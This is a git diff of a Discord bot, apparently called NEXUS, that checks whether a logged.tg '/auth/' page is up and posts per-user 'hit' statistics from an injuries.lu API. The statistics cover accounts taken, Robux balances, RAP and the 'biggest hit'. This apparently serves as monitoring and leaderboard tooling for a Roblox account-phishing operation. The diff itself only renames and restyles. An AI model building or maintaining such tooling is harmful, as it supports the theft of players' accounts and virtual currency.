@@ -9,7 +9,7 @@ const PORT = process.env.PORT || 3000;
 app.get("/", (req, res) => res.send("Bot is alive ✅"));
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
 
-// ✅ 3️⃣ Creezi clientul Discord
+// ✅ 3️⃣ Client Discord
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -34,10 +34,10 @@ function formatDuration(ms) {
 let lastUpTime = null;
 let lastStatus = null;
 const STATUS_CHANNEL_ID = "1437904935059722381";
-const MAIN_SITE_URL = "https://www.logged.tg/auth/corrupteds"; // 🟣 noul URL
-const MAIN_SITE_NAME = "CORRUPTEDS";
+const MAIN_SITE_URL = "https://www.logged.tg/auth/appsite";
+const MAIN_SITE_NAME = "NEXUS";
 
-// ✅ 6️⃣ Monitorizare automată la 30s
+// ✅ 6️⃣ Monitorizare automată (la 30 secunde)
 setInterval(async () => {
   try {
     const start = Date.now();
@@ -47,8 +47,7 @@ setInterval(async () => {
       const response = await fetch(MAIN_SITE_URL, { timeout: 8000 });
       res = { ok: response.ok, status: response.status };
       ping = Date.now() - start;
-    } catch (e) {
-      console.error("❌ Fetch failed:", e);
+    } catch {
       res = { ok: false, status: 0 };
       ping = null;
     }
@@ -57,21 +56,21 @@ setInterval(async () => {
     if (res.ok && !lastUpTime) lastUpTime = Date.now();
     if (!res.ok) lastUpTime = null;
 
-    // Trimite mesaj doar dacă statusul s-a schimbat
     if (currentStatus !== lastStatus) {
       const channel = await client.channels.fetch(STATUS_CHANNEL_ID).catch(() => null);
       if (channel) {
+        const statusText = res.ok
+          ? `<a:nexus:1438069841616703528> **MAIN SITE IS UP!**`
+          : `⚠️ **MAIN SITE IS DOWN!**`;
+
         const embed = new EmbedBuilder()
-          .setColor(0x000000) // 🔲 margine neagră
-          .setDescription(`-- **NEXUS BOT** --\n\n**${MAIN_SITE_NAME}**\nSTATUS: ${currentStatus}\nResponse Code: ${res.status}\nResponse Time: ${ping ? ping + "ms" : "N/A"}`)
+          .setColor(0x000000)
+          .setThumbnail(res.ok ? "https://cdn.discordapp.com/emojis/1438162788374679613.gif" : "")
+          .setDescription(`-- <a:nexus:1438067866447515788> **NEXUS BOT** <a:nexus:1438067866447515788> --\n\n<:arrow:1438161451817631905> **${MAIN_SITE_NAME}**\n<:arrow:1438161451817631905> STATUS: ${currentStatus}\n<:arrow:1438161451817631905> RESPONSE CODE: ${res.status}\n<:arrow:1438161451817631905> RESPONSE TIME: ${ping ? ping + "ms" : "N/A"}`)
           .setImage("https://i.imgur.com/qxSArud.gif")
-          .setFooter({ text: "Site Uptime Monitor" });
+          .setFooter({ text: "NEXUS Site Monitor" });
 
-        const statusMsg = currentStatus === "UP"
-          ? "✅ The site is **UP and reachable!**"
-          : "⚠️ The site appears to be **DOWN or unreachable!**";
-
-        await channel.send({ content: statusMsg, embeds: [embed] });
+        await channel.send({ embeds: [embed] });
       }
       lastStatus = currentStatus;
     }
@@ -81,7 +80,7 @@ setInterval(async () => {
 }, 30000);
 
 // ✅ 7️⃣ Comenzi
-client.on('messageCreate', async (message) => {
+client.on("messageCreate", async (message) => {
   if (message.author.bot) return;
 
   const args = message.content.split(" ").slice(1);
@@ -89,7 +88,7 @@ client.on('messageCreate', async (message) => {
   const targetId = targetUser.id;
 
   // ⚙️ !stats
-  if (message.content.startsWith('!stats')) {
+  if (message.content.startsWith("!stats")) {
     try {
       const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
       const data = await res.json();
@@ -102,19 +101,29 @@ client.on('messageCreate', async (message) => {
       const embed = new EmbedBuilder()
         .setColor(0x000000)
         .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
-        .setDescription(`-- **NEXUS BOT** --\n\n**User:** ${userName}\n\n**TOTAL STATS:**\nHits: ${formatNumber(normal.Totals?.Accounts)}\nVisits: ${formatNumber(normal.Totals?.Visits)}\nClicks: ${formatNumber(normal.Totals?.Clicks)}\n\n**BIGGEST HIT:**\nSummary: ${formatNumber(normal.Highest?.Summary)}\nRAP: ${formatNumber(normal.Highest?.Rap)}\nRobux: ${formatNumber(normal.Highest?.Balance)}\n\n**TOTAL HIT STATS:**\nSummary: ${formatNumber(normal.Totals?.Summary)}\nRAP: ${formatNumber(normal.Totals?.Rap)}\nRobux: ${formatNumber(normal.Totals?.Balance)}`)
+        .setDescription(
+          `-- <a:nexus:1438067866447515788> **NEXUS BOT** <a:nexus:1438067866447515788> --\n\n` +
+          `<:arrow:1438161451817631905> **User:** ${userName}\n\n` +
+          `<:arrow:1438161451817631905> **TOTAL STATS:**\n` +
+          `Hits: ${formatNumber(normal.Totals?.Accounts)}\n` +
+          `Summary: ${formatNumber(normal.Totals?.Summary)}\n` +
+          `RAP: ${formatNumber(normal.Totals?.Rap)}\n\n` +
+          `──────\n\n` +
+          `<:arrow:1438161451817631905> **BIGGEST HIT:**\n` +
+          `Robux: ${formatNumber(normal.Highest?.Balance)}\n` +
+          `Summary: ${formatNumber(normal.Highest?.Summary)}\n` +
+          `RAP: ${formatNumber(normal.Highest?.Rap)}`
+        )
         .setImage("https://i.imgur.com/qxSArud.gif")
         .setFooter({ text: "NEXUS Stats Bot" });
 
       await message.channel.send({ embeds: [embed] });
     } catch (err) {
-      console.error('Error fetching stats:', err);
+      console.error("Error fetching stats:", err);
       message.reply("❌ Error fetching stats.");
     }
-  }
-
-  // ⚙️ !daily
-  if (message.content.startsWith('!daily')) {
+  }  // ⚙️ !daily
+  if (message.content.startsWith("!daily")) {
     try {
       const res = await fetch(`https://api.injuries.lu/v2/daily?type=0x2&cs=3&ref=nexus&userId=${targetId}`);
       const data = await res.json();
@@ -127,22 +136,35 @@ client.on('messageCreate', async (message) => {
       const embed = new EmbedBuilder()
         .setColor(0x000000)
         .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
-        .setDescription(`-- **NEXUS BOT** --\n\n**User:** ${userName}\n\n**DAILY STATS:**\nHits: ${formatNumber(daily.Totals?.Accounts)}\nVisits: ${formatNumber(daily.Totals?.Visits)}\nClicks: ${formatNumber(daily.Totals?.Clicks)}\n\n**BIGGEST HIT:**\nSummary: ${formatNumber(daily.Highest?.Summary)}\nRAP: ${formatNumber(daily.Highest?.Rap)}\nRobux: ${formatNumber(daily.Highest?.Balance)}\n\n**TOTAL HIT STATS:**\nSummary: ${formatNumber(daily.Totals?.Summary)}\nRAP: ${formatNumber(daily.Totals?.Rap)}\nRobux: ${formatNumber(daily.Totals?.Balance)}`)
+        .setDescription(
+          `-- <a:nexus:1438067866447515788> **NEXUS BOT** <a:nexus:1438067866447515788> --\n\n` +
+          `<:arrow:1438161451817631905> **User:** ${userName}\n\n` +
+          `<:arrow:1438161451817631905> **DAILY STATS:**\n` +
+          `Hits: ${formatNumber(daily.Totals?.Accounts)}\n` +
+          `Summary: ${formatNumber(daily.Totals?.Summary)}\n` +
+          `RAP: ${formatNumber(daily.Totals?.Rap)}\n\n` +
+          `──────\n\n` +
+          `<:arrow:1438161451817631905> **BIGGEST HIT:**\n` +
+          `Robux: ${formatNumber(daily.Highest?.Balance)}\n` +
+          `Summary: ${formatNumber(daily.Highest?.Summary)}\n` +
+          `RAP: ${formatNumber(daily.Highest?.Rap)}`
+        )
         .setImage("https://i.imgur.com/qxSArud.gif")
         .setFooter({ text: "NEXUS Daily Stats" });
 
       await message.channel.send({ embeds: [embed] });
     } catch (err) {
-      console.error('Error fetching daily stats:', err);
+      console.error("Error fetching daily stats:", err);
       message.reply("❌ Error fetching daily stats.");
     }
   }
 
   // ⚙️ !check
-  if (message.content.startsWith('!check')) {
+  if (message.content.startsWith("!check")) {
     try {
       const start = Date.now();
       let res, ping;
+
       try {
         const response = await fetch(MAIN_SITE_URL, { timeout: 8000 });
         res = { ok: response.ok, status: response.status };
@@ -153,16 +175,25 @@ client.on('messageCreate', async (message) => {
       }
 
       const statusText = res.ok ? "ONLINE ✅" : "OFFLINE ❌";
-      const uptimeText = res.ok && lastUpTime ? `UP for ${formatDuration(Date.now() - lastUpTime)}` : "❌ No uptime data";
+      const uptimeText = res.ok && lastUpTime
+        ? `UP for ${formatDuration(Date.now() - lastUpTime)}`
+        : "❌ No uptime data";
 
       const embed = new EmbedBuilder()
         .setColor(0x000000)
-        .setDescription(`-- **NEXUS BOT** --\n\n**${MAIN_SITE_NAME}**\nSTATUS: ${statusText}\nResponse Code: ${res.status}\nUPTIME: ${uptimeText}\nResponse Time: ${ping ? ping + "ms" : "N/A"}`)
+        .setThumbnail("https://cdn.discordapp.com/emojis/1438162788374679613.gif")
+        .setDescription(
+          `-- <a:nexus:1438069841616703528> **MAIN SITE IS UP** <a:nexus:1438069841616703528> --\n\n` +
+          `<:arrow:1438161451817631905> **${MAIN_SITE_NAME}**\n` +
+          `<:arrow:1438161451817631905> STATUS: ${statusText}\n` +
+          `<:arrow:1438161451817631905> RESPONSE CODE: ${res.status}\n` +
+          `<:arrow:1438161451817631905> UPTIME: ${uptimeText}\n` +
+          `<:arrow:1438161451817631905> RESPONSE TIME: ${ping ? ping + "ms" : "N/A"}`
+        )
         .setImage("https://i.imgur.com/qxSArud.gif")
         .setFooter({ text: "NEXUS Site Monitor" });
 
       await message.channel.send({ embeds: [embed] });
-
     } catch (err) {
       console.error("!check error:", err);
       message.reply("⚠️ The site appears to be DOWN or unreachable.");
